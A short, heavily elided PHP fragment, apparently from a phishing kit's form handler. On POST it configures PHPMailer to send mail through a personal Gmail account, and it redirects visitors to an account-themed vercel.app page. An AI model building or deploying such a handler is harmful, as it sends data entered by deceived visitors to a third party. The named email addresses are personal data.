...
header("Location: https://account-now-submit-page-data.vercel.app/");
...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    try {
        ...
        $mail->SMTPAuth   = true;
        $mail->Username   = 'Aliceroymoringu6@gmail.com'; // Replace with your email address
        ...
        // Email properties
        $mail->setFrom('hasenaroy88@gmail.com', 'Ghaliya');
